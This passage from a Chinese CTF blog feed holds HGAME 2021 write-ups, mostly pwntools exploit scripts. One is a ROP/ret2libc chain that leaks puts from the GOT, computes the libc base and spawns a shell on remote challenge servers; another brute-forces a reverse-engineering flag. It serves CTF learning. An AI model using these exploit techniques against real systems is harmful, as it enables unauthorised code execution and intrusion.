&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> off &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40070a&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> puts_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>sym[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;paSsw0rd&amp;#39;&lt;/span>&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">0x20&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">+&lt;/span> p64(libc_base &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">0x4f432&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendafter(&lt;span style="color:#4070a0">&amp;#34;password:&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="without_leak">without_leak&lt;/h3>
&lt;p>64 位 &lt;code>ret2dl-resolve&lt;/code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 &lt;code>ret2dl-resolve&lt;/code>。由于提供了 &lt;code>libc&lt;/code>，考虑通过伪造 &lt;code>link_map&lt;/code> 结构体 getshell。打本地的时候，即便打通了也会有&lt;/p></description></item><item><title>HGAME-WEEK2-WP</title><link>https://chujdk.github.io/wp/1078.html</link><pubDate>Sun, 14 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1078.html</guid><description>&lt;h2 id="re">RE&lt;/h2>
&lt;h3 id="fake_debugger-beta">fake_debugger beta&lt;/h3>
&lt;p>没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#context(log_level = &amp;#39;debug&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total_char &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&amp;gt;,&amp;lt;:;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\&amp;#34;\&amp;#39;\\&lt;/span>&lt;span style="color:#4070a0">`~!@#$%^&amp;amp;*()&lt;/span>&lt;span style="color:#70a0d0">{}&lt;/span>&lt;span style="color:#4070a0">[]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">test&lt;/span>(flag_now):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;101.132.177.131&amp;#34;&lt;/span>,&lt;span style="color:#40a070">9999&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#666">=&lt;/span> flag_now
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;now!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#40a070">2&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(flag_now)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;---&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39; &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;eax: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> code
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">get_next&lt;/span>(flag_now):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;101.132.177.131&amp;#34;&lt;/span>,&lt;span style="color:#40a070">9999&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#666">=&lt;/span> flag_now &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;now!&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#40a070">2&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(flag_now) &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#40a070">2&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#34;---&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,&lt;span style="color:#4070a0">&amp;#39; &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#39;ebx: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> code
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;hgame{You_Kn0w_debuG&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span>(flag[&lt;span style="color:#666">-&lt;/span>&lt;span style="color:#40a070">1&lt;/span>] &lt;span style="color:#666">!=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;}&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mapping &lt;span style="color:#666">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> charac &lt;span style="color:#007020;font-weight:bold">in&lt;/span> total_char:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mapping[test(flag &lt;span style="color:#666">+&lt;/span> charac)] &lt;span style="color:#666">=&lt;/span> charac
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#60a0b0;font-style:italic">#print(str(test(charac)) + &amp;#39;:&amp;#39; + charac + &amp;#39;=&amp;gt;&amp;#39; + mapping[test(charac)])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> flag &lt;span style="color:#666">+=&lt;/span> mapping[get_next(flag)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020">print&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020">print&lt;/span> flag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分了几次爆破，所以这个脚本的起点就几乎是 &lt;code>flag&lt;/code> 了&lt;/p></description></item><item><title>HGAME2021-WEEK2-PWN-WP</title><link>https://chujdk.github.io/wp/1079.html</link><pubDate>Tue, 09 Feb 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1079.html</guid><description>&lt;h3 id="rop_primary">rop_primary&lt;/h3>
&lt;p>没什么难度，就是单纯的 ROP&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#60a0b0;font-style:italic"># coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">pwn&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">from&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">LibcSearcher&lt;/span> &lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#666">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">import&lt;/span> &lt;span style="color:#0e84b5;font-weight:bold">re&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#666">=&lt;/span> ELF(&lt;span style="color:#4070a0">&amp;#34;./rop_primary&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401613&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_r15_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401611&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_r14_r15_ret &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#40a070">0x401610&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">def&lt;/span> &lt;span style="color:#06287e">matrixMul&lt;/span>(A, B):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span> &lt;span style="color:#007020">len&lt;/span>(A[&lt;span style="color:#40a070">0&lt;/span>]) &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#007020">len&lt;/span>(B):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#666">=&lt;/span> [[&lt;span style="color:#40a070">0&lt;/span>] &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">len&lt;/span>(B[&lt;span style="color:#40a070">0&lt;/span>]) &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(A))]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(A)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> j &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(B[&lt;span style="color:#40a070">0&lt;/span>])):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> k &lt;span style="color:#007020;font-weight:bold">in&lt;/span> &lt;span style="color:#007020">range&lt;/span>(&lt;span style="color:#007020">len&lt;/span>(B)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res[i][j] &lt;span style="color:#666">+=&lt;/span> &lt;span style="color:#007020">int&lt;/span>(A[i][k]) &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#007020">int&lt;/span>(B[k][j])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">return&lt;/span> res
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh &lt;span style="color:#666">=&lt;/span> remote(&lt;span style="color:#4070a0">&amp;#34;159.75.104.107&amp;#34;&lt;/span>,&lt;span style="color:#40a070">30372&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;A:&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matA &lt;span style="color:#666">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matB &lt;span style="color:#666">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span> &lt;span style="color:#40a070">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> number_string &lt;span style="color:#666">=&lt;/span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span>(number_string &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#4070a0">&amp;#39;B:&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> matA&lt;span style="color:#666">.&lt;/span>append(re&lt;span style="color:#666">.&lt;/span>findall(&lt;span style="color:#4070a0">r&lt;/span>&lt;span style="color:#4070a0">&amp;#34;\d+\.?\d*&amp;#34;&lt;/span>,number_string))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">while&lt;/span> &lt;span style="color:#40a070">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> number_string &lt;span style="color:#666">=&lt;/span> sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>,drop &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#007020;font-weight:bold">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">if&lt;/span>(number_string &lt;span style="color:#666">==&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a * b = ?&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> matB&lt;span style="color:#666">.&lt;/span>append(re&lt;span style="color:#666">.&lt;/span>findall(&lt;span style="color:#4070a0">r&lt;/span>&lt;span style="color:#4070a0">&amp;#34;\d+\.?\d*&amp;#34;&lt;/span>,number_string))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>matAns &lt;span style="color:#666">=&lt;/span> matrixMul(matA,matB)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020">print&lt;/span> matAns
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#007020;font-weight:bold">for&lt;/span> i &lt;span style="color:#007020;font-weight:bold">in&lt;/span> matAns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#007020;font-weight:bold">for&lt;/span> j &lt;span style="color:#007020;font-weight:bold">in&lt;/span> i:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sh&lt;span style="color:#666">.&lt;/span>sendline(&lt;span style="color:#007020">str&lt;/span>(j))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>recvuntil(&lt;span style="color:#4070a0">&amp;#34;best&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x30&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">8&lt;/span> &lt;span style="color:#666">+&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>got[&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(elf&lt;span style="color:#666">.&lt;/span>symbols[&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>]) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0x40157B&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendline(payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak_addr &lt;span style="color:#666">=&lt;/span> u64(sh&lt;span style="color:#666">.&lt;/span>recv(&lt;span style="color:#40a070">6&lt;/span>)&lt;span style="color:#666">.&lt;/span>ljust(&lt;span style="color:#40a070">8&lt;/span>,&lt;span style="color:#4070a0">&amp;#39;&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\x00&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#666">.&lt;/span>success(&lt;span style="color:#4070a0">&amp;#34;addr:&amp;#34;&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#007020">hex&lt;/span>(leak_addr))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#666">=&lt;/span> LibcSearcher(&lt;span style="color:#4070a0">&amp;#39;puts&amp;#39;&lt;/span>,leak_addr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#666">=&lt;/span> leak_addr &lt;span style="color:#666">-&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#34;puts&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#666">.&lt;/span>success(&lt;span style="color:#4070a0">&amp;#34;libc_base:&amp;#34;&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#007020">hex&lt;/span>(libc_base))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#666">=&lt;/span> libc_base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#34;system&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin_sh_addr &lt;span style="color:#666">=&lt;/span> libc_base &lt;span style="color:#666">+&lt;/span> libc&lt;span style="color:#666">.&lt;/span>dump(&lt;span style="color:#4070a0">&amp;#39;str_bin_sh&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">=&lt;/span> &lt;span style="color:#4070a0">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">0x30&lt;/span> &lt;span style="color:#666">+&lt;/span> &lt;span style="color:#4070a0">&amp;#39;b&amp;#39;&lt;/span> &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">8&lt;/span> &lt;span style="color:#666">+&lt;/span> p64(pop_r14_r15_ret) &lt;span style="color:#666">+&lt;/span> p64(&lt;span style="color:#40a070">0&lt;/span>) &lt;span style="color:#666">*&lt;/span> &lt;span style="color:#40a070">2&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#666">+=&lt;/span> p64(pop_rdi_ret) &lt;span style="color:#666">+&lt;/span> p64(bin_sh_addr) &lt;span style="color:#666">+&lt;/span> p64(system_addr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>sendlineafter(&lt;span style="color:#4070a0">&amp;#39;best&lt;/span>&lt;span style="color:#4070a0;font-weight:bold">\n&lt;/span>&lt;span style="color:#4070a0">&amp;#39;&lt;/span>,payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh&lt;span style="color:#666">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒&lt;/p></description></item><item><title>HGAME2021-WEAK1-WP</title><link>https://chujdk.github.io/wp/1044.html</link><pubDate>Sun, 07 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1044.html</guid><description>&lt;p>许久没有更新博客了，主要是因为最近都在打 &lt;code>hgame&lt;/code>，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的合集。bin 的题是都解出来了，别的方向大概也就做了做签到，应该说是真的不会，最后的总分是真的不怎么好看，pwn手心里苦啊。&lt;/p></description></item><item><title>BUU-starctf_2019_quicksort-WP</title><link>https://chujdk.github.io/wp/1040.html</link><pubDate>Fri, 29 Jan 2021 22:43:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1040.html</guid><description>&lt;p>不知不觉就在factorio中颓了一天，`所以就做了这么一道不能算难的题目。&lt;/p>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/300338513.png
">&lt;/div>
&lt;div style="text-align:center">&lt;img src="https://chujdk.github.io/usr/uploads/2021/01/1582729249.png
">&lt;/div>
